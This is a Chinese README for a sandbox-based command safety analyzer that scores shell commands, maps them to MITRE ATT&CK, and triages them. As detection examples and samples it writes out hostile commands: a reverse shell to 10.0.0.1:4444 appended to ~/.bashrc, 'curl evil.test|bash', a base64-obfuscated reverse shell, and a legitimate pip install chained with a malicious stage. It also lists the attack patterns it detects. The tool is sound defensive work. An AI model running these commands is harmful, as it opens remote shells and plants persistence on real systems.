# Command Safety Analyzer with OpenSandbox — v4

在 OpenSandbox 隔离沙箱中运行命令，通过 **24 维度深度行为分析** + **MITRE ATT&CK 映射 (40+ 技术)** + **加权评分 + 攻击链关联 + 命令去混淆 + 快速预判** 判断命令安全性。

## 快速开始

```bash
# 前置: Docker + Python3
chmod +x run_all.sh checker.sh

# 运行全部样本 (白+黑), 自动提交结果
./run_all.sh

# 只跑白样本
./run_all.sh white

# 只跑黑样本
./run_all.sh black

# 只跑指定样本
./run_all.sh black:b01

# 不自动提交
./run_all.sh all --no-commit

# 失败重试 3 次
./run_all.sh all --retry 3

# 国内镜像加速
REGISTRY_MIRROR="sandbox-registry.cn-zhangjiakou.cr.aliyuncs.com/opensandbox" ./run_all.sh
```

## 项目结构

```
├── checker.sh          # 单命令深度检测器 (OpenSandbox 沙箱 + 24 维度分析)
├── triage.sh           # 独立快速预判 (零依赖, 毫秒级, 98.6% 准确率)
├── test_patterns.sh    # 模式匹配验证测试套件 (116 测试, 100% 通过)
├── benchmark.sh        # 性能基准测试 (吞吐量 / 延迟 / 性能等级)
├── run_all.sh          # 批量运行 + Git 自动提交 + 性能分析 + 重试 + 预判对比
├── CLAUDE.md           # 项目上下文 (Claude Code 开发辅助)
├── samples/
│   ├── white.jsonl     # 白样本 35 条 (安全命令, 含边界案例)
│   └── black.jsonl     # 黑样本 35 条 (恶意命令, 含伪装/混淆)
├── reports/
│   ├── white/          # 白样本报告 (JSON + log)
│   ├── black/          # 黑样本报告
│   └── summary.jsonl   # 汇总结果 (含风险评分 + MITRE + 置信度)
└── README.md
```

## 样本格式

`samples/*.jsonl` 每行一个 JSON:

```json
{"id": "w01", "label": "safe", "desc": "echo hello", "command": "echo 'hello world'"}
{"id": "b01", "label": "malicious", "desc": "reverse shell", "command": "echo 'bash -i >& ...' >> ~/.bashrc"}
```

## 快速预判模式

两种方式使用快速预判（不需要 Docker）:

### 方式 1: 独立脚本 triage.sh (推荐, 零依赖)

```bash
# 直接使用 (毫秒级响应, 98.6% 准确率)
COMMAND="echo 'bash -i >& /dev/tcp/10.0.0.1/4444' >> ~/.bashrc" ./triage.sh
# 退出码: 0=PASS, 1=REVIEW, 2=BLOCK

# JSON 管道输入
echo '{"command":"curl evil.test|bash"}' | ./triage.sh --json-input

# 在 CI/CD 中使用
if COMMAND="$USER_CMD" ./triage.sh > /dev/null 2>&1; then
    echo "命令安全, 放行"
else
    echo "命令可疑, 需要审批"
fi
```

### 方式 2: checker.sh 快速模式

```bash
FAST_TRIAGE=1 COMMAND="..." ./checker.sh
```

| 预判级别 | 含义 | 建议动作 | 退出码 |
|----------|------|----------|--------|
| `BLOCK` | 高置信恶意 | 直接阻断 | 2 |
| `REVIEW` | 需深度分析 | 启动沙箱检测 | 1 |
| `PASS` | 高置信安全 | 直接放行 | 0 |

## 命令链分解

v4.3 新增命令链分解分析，拆分 `;`、`&&`、`||`、`|` 连接的多阶段命令：

```bash
# 示例: 合法命令掩护恶意阶段
pip install requests && echo 'bash -i >& /dev/tcp/...' >> ~/.bashrc
# 分解为:
#   [1] [OK] pip install requests  &&
#   [2] [!!] echo 'bash ...' >> ~/.bashrc  END
#   !! 阶段 1 (合法) 掩护阶段 2 (恶意)
```

## 24 维度检测体系

| #  | 维度 | 方法 | MITRE 覆盖 |
|----|------|------|------------|
| 1  | 文件变更 | 执行前后文件系统快照对比 | T1105, T1222 |
| 2  | 实时文件事件 | inotifywait 系统目录 + /tmp 独立探针 | - |
| 3  | 用户/权限 | passwd/shadow/sudoers/SSH/PAM 全面对比 | T1136, T1098 |
| 4  | 持久化 | cron/cron.d/systemd/rc.local/init.d/at/timer | T1053, T1543, T1037 |
| 5  | Shell 环境 | .bashrc/.profile/etc/profile 全量对比 | T1546.004 |
| 6  | 网络连接 | /proc/net/tcp 高频轮询(0.5s) + ss | T1071 |
| 7  | DNS 配置 | /etc/resolv.conf 变更检测 | T1016 |
| 8  | 可疑二进制 | /tmp /var/tmp /dev/shm 可执行文件扫描 + file 元信息 | T1105 |
| 9  | 资源消耗 | CPU / 内存指标 + 异常增长检测 | T1496 |
| 10 | 进程树 | 命令执行期间全进程树追踪(1s) | T1057 |
| 11 | 文件内容 | 新增文件 + shell 配置恶意模式匹配 (70+ 规则) | T1059, T1048 |
| 12 | 内核/模块 | lsmod/proc/modules 变更检测 | T1014 |
| 13 | SUID/SGID | 新增 SUID/SGID 文件检测 | T1548.001 |
| 14 | 环境变量 | LD_PRELOAD/LD_LIBRARY_PATH/PATH 注入检测 | T1574 |
| 15 | 二进制完整性 | bash/su/sudo/passwd/sshd 等系统二进制 hash | T1554 |
| 16 | 符号链接 | 新增指向敏感文件的 symlink 检测 | T1036 |
| 17 | 文件能力 | getcap 变更检测 (Linux Capabilities) | T1548.001 |
| 18 | 输出分析 | stdout/stderr 密钥/凭据/hash 泄露检测 | T1048 |
| 19 | 熵分析 | 新增文件 Shannon 熵 (高熵=加密/压缩载荷) | T1027 |
| 20 | 计划任务差异 | crontab 逐行差异 + cron.d 内容扫描 | T1053.003 |
| 21 | 隐藏进程 | /proc 遍历 vs ps 交叉对比 | T1564.001 |
| 22 | 信号处理 | trap 劫持检测 (EXIT/INT/TERM/HUP) | T1059.004 |
| 23 | 攻击链关联 | 多维度交叉研判 (5 种攻击链模式) | 多个 |
| 24 | 文件权限 | 敏感文件权限变更 + world-writable 检测 | T1222.002 |

## 攻击链关联分析

v4 新增多维度交叉关联，识别组合攻击模式:

| 攻击链 | 触发条件 | 典型场景 |
|--------|----------|----------|
| 恶意软件部署链 | 文件落地 + 持久化 | 下载木马 + cron 驻留 |
| 后门账户链 | 用户变更 + SSH key | useradd + authorized_keys |
| 高级攻击链 | 反取证 + 多维恶意行为 | 清历史 + 后门 |
| C2 通信链 | DNS 劫持 + 外部连接 | 改 resolv.conf + 回连 |
| Rootkit 链 | LD_PRELOAD + 二进制篡改 | so 注入 + 替换系统命令 |

## 恶意模式检测 (70+ 规则)

覆盖以下攻击类别:

- **反弹 Shell**: /dev/tcp, bash -i, netcat, python/perl/ruby/php socket, socat, named pipe
- **编码载荷**: base64 decode|sh, xxd hex decode, python exec(), eval+命令替换
- **下载执行**: curl|sh, wget|sh, curl -o+chmod, download-and-exec 链
- **凭据外泄**: /etc/shadow 读取, base64 编码外传, curl POST 外泄
- **权限提升**: SUID 设置, sudoers 修改, sudo 密码管道
- **反取证**: HISTFILE=/dev/null, history 清除, 时间戳篡改
- **LD_PRELOAD**: ld.so.preload 写入, 环境变量注入
- **Living-off-the-Land**: python http.server, openssl, socat, busybox nc
- **进程伪装**: exec -a, prctl PR_SET_NAME
- **防御规避**: 关闭防火墙, 停安全服务, SELinux 关闭
- **网络隧道**: SSH -R/-L/-D 隧道, 后台隧道
- **沙箱检测**: VM/容器检测, CPU 型号检查, virtio 磁盘检测
- **进程注入**: GDB attach, ptrace, /proc/pid/mem 访问
- **编译后门**: gcc -shared 编译 rootkit .so

## 评分系统

加权风险评分 (0-100) + 置信度评估:

| 评分范围 | 判定 | 含义 |
|----------|------|------|
| 0-9 | `LIKELY_SAFE` | 所有检查通过 |
| 10-24 | `LOW_RISK` | 轻微异常, 可能误报 |
| 25-59 | `SUSPICIOUS` | 存在可疑行为 |
| 60-100 | `DANGEROUS` | 多个高危发现, 极可能恶意 |

置信度评估:

| 置信度 | 条件 |
|--------|------|
| `HIGH` | 多维度交叉验证 / 攻击链确认 / 3+ CRITICAL |
| `MEDIUM` | 2+ 维度覆盖 / 单 CRITICAL |
| `LOW` | 单维度发现 / 可能误报 |

- 合法安装器命令 (apt/pip/npm/docker/go/make/...) 自动降权
- CRITICAL 级发现 (>=2个) 直接判定 DANGEROUS
- 攻击链发现 + CRITICAL = 自动升级为 DANGEROUS

## MITRE ATT&CK 覆盖

支持 40+ MITRE ATT&CK 技术的自动映射，覆盖全攻击生命周期:

- **Execution**: T1059.004 (Unix Shell), T1059.006 (Python)
- **Persistence**: T1053 (Cron/At/Timer), T1543 (Systemd), T1037 (RC/Init), T1546 (.bashrc)
- **Privilege Escalation**: T1548 (SUID/Sudo), T1574 (LD_PRELOAD/DLL), T1055 (Process Injection)
- **Defense Evasion**: T1070 (Clear History/Timestomp), T1027 (Obfuscation), T1014 (Rootkit), T1036 (Masquerading), T1562 (Impair Defenses), T1564 (Hidden Artifacts), T1497 (Sandbox Evasion)
- **Credential Access**: T1556 (Modify Auth/PAM), T1003 (Credential Dumping), T1552 (Credentials in Files)
- **Discovery**: T1057 (Process), T1082 (System Info), T1016 (Network Config), T1033 (User), T1049 (Connections), T1087 (Account), T1069 (Groups)
- **Lateral Movement**: T1021.004 (SSH)
- **Exfiltration**: T1048 (Alternative Protocol)
- **Command and Control**: T1071 (Web/DNS Protocol), T1105 (Tool Transfer)
- **Impact**: T1496 (Cryptomining)

## 命令去混淆引擎

v4.1 新增多层去混淆引擎，在静态分析前自动还原混淆命令:

| 层 | 类型 | 示例 |
|----|------|------|
| 1 | base64 解码 | `echo 'YmFzaC...' \| base64 -d` -> `bash -i >& ...` |
| 2 | hex 解码 | `\x62\x61\x73\x68` -> `bash` |
| 3 | eval/exec 展开 | `eval "$(...)"` -> 内层命令 |
| 4 | $'...' 解码 | `$'\x62\x61\x73\x68'` -> `bash` |

去混淆后的命令会被同步进行恶意模式匹配，有效对抗编码逃避。

## 安全建议引擎

根据分析结果自动生成可操作的安全建议:

| 判定 | 建议 |
|------|------|
| `DANGEROUS` | BLOCK + 具体修复步骤 (检查 crontab/passwd/authorized_keys 等) |
| `SUSPICIOUS` | REVIEW + 人工审核 + 置信度说明 |
| `LOW_RISK` | ALLOW + 记录审计日志 |
| `LIKELY_SAFE` | ALLOW + 放行 |

## 报告格式 (v4.1)

```json
{
  "version": "4.1",
  "command": "...",
  "verdict": "DANGEROUS",
  "risk_score": 75,
  "confidence": "HIGH",
  "recommendations": [
    "BLOCK: 强烈建议阻止此命令执行",
    "检查 crontab -l、/etc/cron.d/、systemd services 是否被篡改"
  ],
  "is_legitimate_pattern": false,
  "findings_summary": {
    "total": 5, "critical": 3, "warn": 2, "info": 0, "dimensions_hit": 4
  },
  "findings": [...],
  "deobfuscation": {
    "original": "echo 'YmFz...' | base64 -d | bash",
    "deobfuscated": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "layers": [{"type": "base64", "decoded": "bash -i >& ..."}]
  },
  "timeline": [
    {"phase": "baseline", "time": "...", "desc": "基线采集完成"},
    {"phase": "probes_start", "time": "...", "desc": "探针启动"},
    {"phase": "exec_end", "time": "...", "desc": "命令执行结束"},
    {"phase": "post_snapshot", "time": "...", "desc": "分析完成"}
  ],
  "mitre_attack": {...},
  "mitre_tactics": {
    "Persistence": ["T1053.003"],
    "Defense Evasion": ["T1070.003"]
  },
  "dimensions": { ... }
}
```

## 添加新样本

编辑 `samples/white.jsonl` 或 `samples/black.jsonl`，追加一行 JSON 即可。

```bash
# 添加白样本
echo '{"id": "w31", "label": "safe", "desc": "my safe cmd", "command": "echo hello"}' >> samples/white.jsonl

# 添加黑样本
echo '{"id": "b31", "label": "malicious", "desc": "my test", "command": "..."}' >> samples/black.jsonl

# 测试单条
./run_all.sh white:w31
```

## 集成模式

### API 网关集成

```bash
# 在 API 网关中做前置检查
user_command="$1"
result=$(COMMAND="$user_command" ./triage.sh 2>/dev/null)
level=$(echo "$result" | python3 -c "import sys,json; print(json.load(sys.stdin)['level'])")

case "$level" in
    PASS)   execute_command "$user_command" ;;
    REVIEW) queue_for_review "$user_command" ;;
    BLOCK)  reject_command "$user_command" ;;
esac
```

### Webhook 集成

```bash
# 接收 webhook, 分析命令, 返回结果
echo "$WEBHOOK_BODY" | ./triage.sh --json-input
# 退出码: 0=PASS, 1=REVIEW, 2=BLOCK
```

### 性能基准

```bash
./benchmark.sh              # 默认 100 次迭代
./benchmark.sh 500          # 高精度测试
./benchmark.sh 100 --json   # JSON 格式输出
```

| 性能等级 | 延迟 | 适用场景 |
|----------|------|----------|
| S 级 | < 50ms | 实时网关 |
| A 级 | < 100ms | API 集成 |
| B 级 | < 500ms | CI/CD |
| C 级 | > 500ms | 需优化 |

## CI/CD 集成

### SARIF 输出 (GitHub Code Scanning / GitLab SAST)

每次分析自动生成 SARIF v2.1.0 报告:

```bash
# 分析后会自动生成三种格式
COMMAND="..." ./checker.sh
# reports/safety_report_*.json       — 完整 JSON 报告
# reports/safety_report_*.txt        — 人类可读摘要
# reports/safety_report_*.sarif.json — SARIF 格式 (CI/CD)
```

上传到 GitHub Code Scanning:
```yaml
- uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: reports/
    category: command-safety
```

### GitHub Actions

项目自带 `.github/workflows/command-scan.yml`:
- PR 触发: 自动运行模式验证测试 + 样本预判
- 手动触发: 支持输入命令进行深度沙箱分析
- SARIF 结果自动上传到 Code Scanning

## v3 -> v4 变更日志

### v4.6
- 新增: benchmark.sh 性能基准测试工具 (吞吐量/延迟/S-A-B-C 等级评定)
- 新增: 集成模式文档 (API 网关/Webhook/CI/CD 完整示例)
- 完善: 全脚本语法验证通过, 全样本 JSONL 验证通过

### v4.5
- 新增: SARIF v2.1.0 输出 (GitHub Code Scanning / GitLab SAST 集成)
  每次分析自动生成 .sarif.json 报告
- 新增: GitHub Actions 工作流 (.github/workflows/command-scan.yml)
  PR 自动测试 + 手动深度分析 + SARIF 上传
- 增强: 网络行为检测 — C2 常见端口检测/多目标扫描检测/高位端口检测
- 维度 24 -> 24 (网络维度增强, 新增 C2 端口指纹库)

### v4.4
- 新增: test_patterns.sh 模式匹配验证测试套件 (116 测试, 100% 通过率)
  覆盖 11 个测试类别: 反弹Shell/编码混淆/下载执行/持久化/权限提升/凭据外泄/反取证/防御规避/安全命令/合法安装器/样本集
- 新增: CLAUDE.md 项目上下文文件

### v4.3
- 新增: triage.sh 独立快速预判脚本 (零依赖, 毫秒级, 98.6% 准确率)
  支持环境变量和 JSON 管道输入, 退出码区分 PASS/REVIEW/BLOCK
- 新增: 命令链分解分析 (拆分 ;/&&/||/| 多阶段命令)
  检测 "合法命令掩护恶意阶段" 攻击模式
- 新增: run_all.sh 快速预判精度对比 (自动测试 triage vs sandbox 准确率)
- 报告格式: v4.2 -> v4.3 (新增 command_chain)

### v4.2
- 新增: 快速预判模式 (FAST_TRIAGE=1, 不启动沙箱, 毫秒级 API 响应)
- 新增: 人类可读文本摘要 (.txt 报告, text_summary 字段)
- 新增: D24 文件权限变更追踪 (敏感文件权限 + world-writable 检测)
- 新增: 快速预判 vs 深度分析对比 (识别纯动态攻击)
- 新增: 10 个边界案例样本 (35+35, 含伪装恶意/安全误报场景)
- 报告格式: v4.1 -> v4.2 (新增 fast_triage/text_summary)

### v4.1
- 新增: 命令去混淆引擎 (base64/hex/eval/$'' 四层解码)
- 新增: 安全建议引擎 (可操作的修复建议)
- 新增: 执行时间线 (baseline -> probes -> exec -> analysis)
- 增强: 反逃逸黑名单 (30+ 规则, 覆盖 PAM/systemd/init.d/firewall/reverse shell)
- 报告格式: v4.0 -> v4.1 (新增 recommendations/deobfuscation/timeline)

### v4.0
- 检测维度: 19 -> 23 (新增: 计划任务差异/隐藏进程/信号处理/攻击链关联)
- 恶意模式: 50+ -> 70+ (新增: LotL/进程伪装/时间戳篡改/编译后门/网络隧道)
- 合法白名单: 12 -> 30+ (新增: docker/go/make/terraform/ansible 等)
- MITRE 映射: 30+ -> 40+ 技术
- 评分引擎: 新增置信度评估 + 攻击链加成
- 报告格式: v3.1 -> v4.0 (新增 confidence/findings_summary/mitre_tactics)
- 批量运行: 新增 --retry 重试参数
- 样本集: 20+20 -> 30+30 (新增边界案例/高级攻击/LotL)
